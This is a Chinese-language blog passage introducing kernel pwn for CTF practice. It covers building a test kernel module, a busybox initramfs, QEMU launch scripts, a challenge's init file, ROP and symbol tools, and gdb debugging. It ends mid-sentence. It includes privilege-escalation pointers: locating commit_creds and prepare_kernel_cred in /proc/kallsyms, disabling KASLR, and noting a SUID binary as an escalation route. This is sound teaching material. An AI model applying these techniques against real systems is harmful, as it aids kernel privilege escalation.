<p>根据<a class="link"   href="https://bbs.t-firefly.com/forum.php?mod=viewthread&tid=1826%E8%BF%99%E7%AF%87%E6%B1%82%E5%8A%A9%E5%B8%96%EF%BC%8C%E5%8F%91%E7%8E%B0%E9%97%AE%E9%A2%98%E5%A4%A7%E6%A6%82%E6%98%AF%E6%88%91%E4%BB%AC%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%A7%E5%B0%8F%E5%86%99%E6%95%8F%E6%84%9F%EF%BC%8C%E8%80%8C%60net/netfilter/%60%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%8F%AA%E6%9C%89%60xt_tcpmss.c%60%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E3%80%82%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E6%8A%8A%E5%85%B6%E6%94%B9%E5%90%8D%E4%B8%BA%60xt_TCPMSS.c%60%E8%AF%95%E8%AF%95%E3%80%82%E7%84%B6%E5%90%8E%E6%9C%80%E5%90%8E%E5%87%BA%E7%8E%B0%E5%A6%82%E4%B8%8B%E6%8F%90%E7%A4%BA%EF%BC%8C%E5%88%99%E7%BC%96%E8%AF%91%E6%88%90%E5%8A%9F%E3%80%82" >https://bbs.t-firefly.com/forum.php?mod=viewthread&amp;tid=1826这篇求助帖，发现问题大概是我们的文件系统大小写敏感，而`net/netfilter/`目录下只有`xt_tcpmss.c`这个文件。这里我们把其改名为`xt_TCPMSS.c`试试。然后最后出现如下提示，则编译成功。<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113223946647.png"
                      class=""
                >

<h5 id="编译内核驱动"><a href="#编译内核驱动" class="headerlink" title="编译内核驱动"></a>编译内核驱动</h5><h6 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h6><p>这里我们以自己编译一个输出Hello World的内核驱动模块为例。</p>
<p>因为我所用的环境是vscode，而windows上的环境没有几个内核的头文件，所以我们要配置wsl远程开发。</p>
<p>安装 WSL 后：</p>
<ol>
<li>在 VSCode 中安装 <a class="link"   href="https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-wsl" >Remote - WSL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 插件。</li>
<li>点击 VSCode 左下角绿色的“打开远程窗口”图标，选择 “WSL: New Window”，进入到 WSL 环境的文件系统。</li>
<li>确保在 WSL 中设置好文件路径共享，通过 <code>/mnt/c</code> 可直接访问 Windows 文件。</li>
</ol>
<p>在 WSL 中，可以直接开发和测试内核模块。具体代码实现如下。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//myko.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">//包含与内核相关的基本功能和工具，比如 printk 函数，用于向内核日志打印消息。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">//定义了 module_init 和 module_exit 宏，这些用于指定模块的入口和退出函数。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">//包含定义 Linux 内核模块所需的基础结构，例如 MODULE_LICENSE 宏。</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明模块的许可证。内核需要知道你的模块是开源的还是闭源的。这里说明可以用 BSD 或 GPL 任一许可证。</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);	</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(<span class="string">&quot;Hello, world!\n&quot;</span>);		<span class="comment">//类似于用户态的 printf，但它打印的信息会进入内核日志而不是终端。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(<span class="string">&quot;Goodbye, cruel world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_init);		<span class="comment">//注册模块的初始化函数，告诉内核加载模块时应调用 my_init。</span></span><br><span class="line">module_exit(my_exit);		<span class="comment">//注册模块的清理函数，告诉内核卸载模块时应调用 my_exit。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h6 id="加载模块"><a href="#加载模块" class="headerlink" title="加载模块"></a>加载模块</h6><p>先创建Makefile以便编译我们写好的内核驱动模块。</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m := myko.o</span><br><span class="line"></span><br><span class="line">KERNELDR := /mnt/e/ctf/kernel/linux-5.15.153</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">moduels_install:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure></div>

<p><code>obj-m</code>:</p>
<p> 指定需要编译的模块目标文件，这里是 <code>myko.ko</code>，源文件为 <code>myko.c</code>。</p>
<p><code>KERNELDR</code>:</p>
<p> 定义内核源码路径，需要提供一个完整内核源码树。此目录必须配置了编译环境和内核头文件。</p>
<p><code>PWD</code>:</p>
<p> 当前模块源代码的路径（<code>pwd</code> 命令的输出），在编译内核模块时会作为参数传递给内核构建系统。</p>
<p><code>modules</code>:</p>
<p>调用内核的构建系统，执行模块编译。</p>
<ul>
<li><code>-C $(KERNELDR)</code>: 切换到内核源码目录并使用它的 Makefile。</li>
<li><code>M=$(PWD)</code>: 指定模块代码所在的目录，内核会到这里查找模块代码并编译。</li>
</ul>
<p><code>modules_install</code>:<br>安装编译完成的模块（<code>myko.ko</code>）到系统指定的模块目录（通常是 <code>/lib/modules/$(uname -r)/</code>）。</p>
<p><code>clean</code>:<br>清除临时文件、编译生成的中间文件（<code>.o</code>、<code>.ko</code>、<code>.mod.c</code> 等）。</p>
<p>然后在终端make即可获取到myko.ko。可能会遇到以下错误：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113230522662.png"
                      class=""
                >

<p>可以先在我们编译好的kernel目录下执行<code>make modules_prepare</code>重新加载符号表。然后就只会报warning而不会直接Error退出。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113230655614.png"
                      class=""
                >

<p>这里还是缺少符号文件。我们先忽略。</p>
<p>然后我们想要通过已经编译好的内核，起一个虚拟环境，以测试自己写好的模块。首先我们安装BusyBox以快速新建一个根文件系统。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install busybox</span><br></pre></td></tr></table></figure></div>

<p>然后按以下方式新建根文件系统，用的是busybox。将一些常用指令创建链接到busybox，busybox会根据指令类型自动执行对应指令。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> initramfs</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件结构</span></span><br><span class="line"><span class="built_in">mkdir</span> -p bin dev etc lib proc sys tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 busybox</span></span><br><span class="line"><span class="built_in">cp</span> $(<span class="built_in">which</span> busybox) ./bin</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line"><span class="built_in">ln</span> -s busybox sh</span><br><span class="line"><span class="built_in">ln</span> -s busybox init</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建简单的 init 脚本</span></span><br><span class="line"><span class="built_in">cat</span> &gt; init &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">#!/bin/sh</span></span><br><span class="line"><span class="string">mount -t proc none /proc</span></span><br><span class="line"><span class="string">mount -t sysfs none /sys</span></span><br><span class="line"><span class="string">mount -t devtmpfs none /dev</span></span><br><span class="line"><span class="string">exec /bin/sh</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">chmod</span> +x init</span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc | gzip &gt; ../initramfs.cpio.gz</span><br></pre></td></tr></table></figure></div>

<p>执行完以上命令后，我们就得到了<code>initramfs.cpio.gz</code>这样一个文件系统，然后我们可以用qemu虚拟机起虚拟环境。先写一个sh脚本。其中用到了qemu虚拟机，所以我们要先进行安装。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install qemu-system-x86</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#run.sh</span></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -m 256 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 earlyprintk=serial debug panic=0&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -kernel <span class="string">&quot;/mnt/e/ctf/kernel/linux-5.15.153/arch/x86/boot/bzImage&quot;</span> \</span><br><span class="line">    -initrd <span class="string">&quot;./initramfs.cpio&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>然而一跑直接报错，执行不了&#x2F;init。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114004241555.png"
                      class=""
                >

<p>这里搞了半天，甚至拿正常题目给的cpio文件系统能够进入内核正确执行。最后发现问题所在，是因为我们用系统自带的包管理器下载的busybox是动态编译的，所以在我们虚拟的环境里，没有配置动态链接库，也就执行不了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114145451508.png"
                      class=""
                >

<p>那么我们可以从<a class="link"   href="https://busybox.net/" >官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>下载源码，然后自己指定静态编译。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-01-14-000023.png"
                      class=""
                >

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">make -j3</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>

<p>然后就能在项目根目录获取到一个静态编译的busybox，把这个busybox扔到我们待打包成文件系统的bin目录下。之后就能正常运行了。有了busybox，我们就可以把一些常用指令都扔去。这里可以写个脚本，把busybox支持的所有指令都给放到bin目录下。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> initramfs/bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> $(busybox --list); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">ln</span> -sf busybox <span class="variable">$cmd</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>

<p>然后对文件系统进行打包，解压。最后run一下看看能不能正常启动。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc | gzip &gt; ../initramfs.cpio.gz</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">gunzip initramfs.cpio.gz</span><br><span class="line">cpio -idmv &lt; initramfs.cpio</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114151349527.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114151546880.png"
                      class=""
                >

<p>现在已经能启动了，不过tty出现了问题，但不影响我们对内核的模块进行测试。然后我们就可以把之前编译好的<strong>myko.ko</strong>扔到虚拟的文件系统里，重新打包一次并运行。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> myko.ko ./initramfs/myko.ko</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line">find . | cpio -o --format=newc  &gt; ../initramfs.cpio</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">cpio -idmv &lt; initramfs.cpio</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure></div>

<p>然后我们就可以装载模块，出现Hello，world！说明正确导入了内核的扩展模块。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114153803147.png"
                      class=""
                >

<h5 id="题目提供环境"><a href="#题目提供环境" class="headerlink" title="题目提供环境"></a>题目提供环境</h5><p>一般kernel pwn题会给出以下几种类型的文件。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">xxx.sh		<span class="comment">//启动脚本</span></span><br><span class="line">bzImage		<span class="comment">//内核脚本</span></span><br><span class="line">xxx.cpio	<span class="comment">//文件系统</span></span><br><span class="line">xxx.ko		<span class="comment">//内核模块文件，相当于用户模式的.so动态链接库</span></span><br></pre></td></tr></table></figure></div>



<p><strong>内核镜像分类</strong></p>
<ul>
<li>vmlinux：原始内核文件</li>
</ul>
<p>在当前目录下提取到 vmlinux  ，为编译出来的原始内核文件。</p>
<ul>
<li>bzImage：压缩内核镜像</li>
</ul>
<p>在当前目录下的 arch&#x2F;x86&#x2F;boot&#x2F; 目录下提取到 bzImage ，为压缩后的内核文件，适用于大内核。</p>
<ul>
<li>zImage &amp;&amp; bzImage</li>
</ul>
<p>zImage 是 vmlinux 经过gzip压缩后的文件。bzImage 中的 bz 表示“big zImage”。bzImage 不是用 bzip2 压缩，而是要偏移到一个位置，使用 gzip 压缩。两者的不同之处在于，zImage 解压缩内核到低端内存(第一个 640K)，bzImage 解压缩内核到高端内存(1M 以上)。如果内核比较小，那么采用 zImage 或 bzImage 都行，如果比较大应该用 bzImage 。</p>
<p>其中我们来看看<code>xxx.sh</code>分析一下启动的过程。</p>
<p>如在<strong>DSBCTF-EasyKernel</strong>这个题中，其提供了3个文件。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111221325011.png"
                      class=""
                >

<p>run.sh中的内容如下：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 256 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>-cpu kvm64</strong></p>
<p>指定虚拟机的 CPU 类型为 <code>kvm64</code>。kvm64是 QEMU 提供的一个优化 CPU 类型，它专为 KVM 提供虚拟化支持。如果运行环境支持 KVM，则可以获得硬件加速。此选项对需要模拟 CPU 特性的程序（如针对 CPU 指令的漏洞开发）特别有用。</p>
<p><strong>-m 256</strong></p>
<p>设置虚拟机内存大小为 <strong>256 MB</strong>。可以根据需要调整这个数值来分配更多或更少的内存。</p>
<p><strong>-nographic</strong></p>
<p>让虚拟机运行在无图形模式（纯终端模式）。禁用图形输出窗口（例如 VGA 显示），仅使用标准输入输出（例如通过 <code>ttyS0</code> 访问）。</p>
<p><strong>-kernel “bzImage”</strong></p>
<p>指定要加载的 Linux 内核文件，通常是已编译好的 <code>bzImage</code> 文件。**<code>bzImage</code>** 是 Linux 内核的可引导压缩映像。</p>
<p><strong>-append “console&#x3D;ttyS0 panic&#x3D;-1 pti&#x3D;off kaslr quiet”</strong></p>
<p>向内核传递启动参数：</p>
<ol>
<li><code>console=ttyS0</code><ul>
<li>将内核的输出和输入重定向到串行端口 <code>ttyS0</code>（第一个串行设备）。</li>
<li>这通常与 <code>-nographic</code> 一起使用。</li>
</ul>
</li>
<li><code>panic=-1</code><ul>
<li>如果内核遇到致命错误（panic），虚拟机会无限期地等待，不会自动重启。</li>
</ul>
</li>
<li><code>pti=off</code><ul>
<li>关闭 Page Table Isolation（PTI）。PTI 是一个用于缓解 Meltdown 漏洞的安全措施，但会影响性能。</li>
</ul>
</li>
<li><code>kaslr</code><ul>
<li>随机化内核地址空间布局（Kernel Address Space Layout Randomization）。</li>
<li>没有 <code>off</code> 说明功能是启用状态；在调试中可以关闭此功能。</li>
</ul>
</li>
<li><code>quiet</code><ul>
<li>启动时减少输出的日志信息，显示更简洁的控制台内容。</li>
</ul>
</li>
</ol>
<p><strong>-monitor &#x2F;dev&#x2F;null</strong></p>
<p>将 QEMU 的管理控制台（Monitor）的输入输出重定向到 <code>/dev/null</code>。QEMU 默认提供一个监控终端，用于控制虚拟机，这里通过设置为 <code>/dev/null</code> 禁用了该功能。</p>
<p><strong>-initrd “.&#x2F;rootfs.cpio”</strong></p>
<p>指定初始 RAM 磁盘（Initial RAM Disk），用 <code>./rootfs.cpio</code> 文件作为虚拟机的初始根文件系统。**<code>rootfs.cpio</code>** 是一个打包的 CPIO 格式文件系统，虚拟机启动时会加载并挂载它为根文件系统。</p>
<p><strong>-net user</strong></p>
<p>启用用户模式网络（User Networking）。提供简单的 NAT 网络环境，不需要额外配置主机的网络。</p>
<p><strong>-net nic</strong></p>
<p>创建一个虚拟网络接口卡（NIC，Network Interface Card），用作虚拟机的网络设备。</p>
<p>然后我们要对文件系统进行解压，之后就能在当前目录下得到整个文件系统结构。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111224302985.png"
                      class=""
                >

<p>之后我们直接<code>./run.sh</code>跑一下，发现已经能够运行起来了，但是由于是本地的环境，所以flag还要我们自己手动设置一下。可以在root目录下自己手动创建一个ctfshow_flag，然后再打包回去文件系统。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111224440566.png"
                      class=""
                >

<p>我们再仔细看看刚刚解压出的在根目录下的内容。其中有ctfshow.ko，也就是我们重点分析的漏洞存在的扩展模块。还有init文件，该文件是linux启动时的初始化文件，包含一些重要信息，而且可以修改该文件的一些内容来方便调试。我们来看看这道题的init里是什么内容。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /                                                                                  </span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">export</span> PATH=/bin</span><br><span class="line"><span class="built_in">export</span> PATH=/sbin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">[ -d /dev ] || <span class="built_in">mkdir</span> -m 0755 /dev</span><br><span class="line">[ -d /sys ] || <span class="built_in">mkdir</span> /sys</span><br><span class="line">[ -d /proc ] || <span class="built_in">mkdir</span> /proc</span><br><span class="line">[ -d /tmp ] || <span class="built_in">mkdir</span> /tmp</span><br><span class="line">[ -d /run ] || <span class="built_in">mkdir</span> /run</span><br><span class="line">[ -d /etc ] || <span class="built_in">mkdir</span> /etc</span><br><span class="line">[ -d /home ] || <span class="built_in">mkdir</span> /home</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/passwd</span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/group</span><br><span class="line"><span class="built_in">chown</span> -R root:root /</span><br><span class="line"><span class="built_in">chown</span> 0:0 /root/ctfshow_flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /root/ctfshow_flag</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> ctfshow:ctfshow -R /home/ctfshow</span><br><span class="line"><span class="built_in">chmod</span> 777 /home/ctfshow</span><br><span class="line"><span class="built_in">chmod</span> 755 /dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /var/lock</span><br><span class="line">mount -t sysfs -o nodev,noexec,nosuid sysfs /sys</span><br><span class="line">mount -t proc -o nodev,nosuid proc /proc</span><br><span class="line"><span class="built_in">ln</span> -sf /proc/mounts /etc/mtab</span><br><span class="line">mount -t devtmpfs -o nosuid,mode=0755 udev /dev</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -t devpts -o noexec,nosuid,gid=5,mode=0620 devpts /dev/pts || <span class="literal">true</span></span><br><span class="line">mount -t tmpfs -o <span class="string">&quot;noexec,nosuid,size=10%,mode=0755&quot;</span> tmpfs /run</span><br><span class="line"></span><br><span class="line">insmod ctfshow.ko</span><br><span class="line"><span class="built_in">chmod</span> o+rw /dev/kqueue</span><br><span class="line"><span class="built_in">chmod</span> u+s /bin/ping</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/perf_event_paranoid</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">exec</span> 0&lt;/dev/console) 2&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line">    <span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line">    <span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> /sbin/init <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>从该文件中我们能看出很多重要信息：</p>
<ul>
<li>flag的权限被设置为了只有root权限可读。</li>
<li>启用了kptr_restrict，perf_event_paranoid，dmesg_restrict的内核保护机制。</li>
<li>对 <code>/bin/ping</code> 设置了 SUID 属性，普通用户运行它时会临时具有 root 权限。如果该二进制文件可以被替换或加载动态链接库，则可能借此实现提权。</li>
<li>存在<code>/dev/kqueue</code>这个设备驱动模块，可能是漏洞利用的关键。</li>
</ul>
<h4 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h4><h5 id="vmlinux-to-elf"><a href="#vmlinux-to-elf" class="headerlink" title="vmlinux-to-elf"></a>vmlinux-to-elf</h5><p>此工具允许从 vmlinux&#x2F;vmlinuz&#x2F;bzImage&#x2F;zImage 内核映像获取完全可分析的 .ELF 文件，其中包含恢复的函数和变量符号。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-pip</span><br><span class="line"><span class="built_in">sudo</span> pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df</span><br><span class="line"><span class="built_in">sudo</span> pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure></div>

<p><strong>使用方式</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span><br></pre></td></tr></table></figure></div>



<h5 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h5><p>用于获取gadget，比ropgadget快。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">pip3 install ropper</span><br></pre></td></tr></table></figure></div>

<p><strong>使用方式</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用，将结果存在g1文件里</span></span><br><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br></pre></td></tr></table></figure></div>



<h5 id="extract-vmlinux"><a href="#extract-vmlinux" class="headerlink" title="extract-vmlinux"></a>extract-vmlinux</h5><p>能够从bzImage等提取出vmlinux。这个脚本在我们编译出的内核源码的scripts目录下。</p>
<p><strong>使用方式</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure></div>



<h4 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h4><p>获取内核特定符号地址</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114201804986.png"
                      class=""
                >

<p>获取驱动加载基地址，又有不同的方式。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/modules</span><br><span class="line">grep module_name /proc/modules</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114202256392.png"
                      class=""
                >



<p>首先需要对 run.sh 做如下修改：</p>
<ul>
<li>添加 nokaslr 关闭地址随机化（不一定需要）。</li>
<li>添加 -s，因为 qemu 其实提供了调试内核的接口，我们可以在启动参数中添加 -gdb dev 来启动调试服务。最常见的操作为在一个端口监听一个 tcp 连接。 QEMU 同时提供了一个简写的方式 -s，表示 -gdb tcp::1234，即在 1234 端口开启一个 gdbserver。</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 256 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off nokaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic    \</span><br><span class="line">    -s</span><br><span class="line">  </span><br></pre></td></tr></table></figure></div>

<p>然后我们就可以在启动qemu后，然后gdb远程连接到gdbserver进行调试。<code>-q</code>指定安静模式，<code>-ex</code>为启动gdb后立即执行指令。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gdb -q -ex <span class="string">&quot;target remote localhost:1234&quot;</span> </span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114203048016.png"
                      class=""
                >

<p>在启动内核后，我们可以使用 <code>add-symbol-file</code> 来添加符号信息，比如</p>
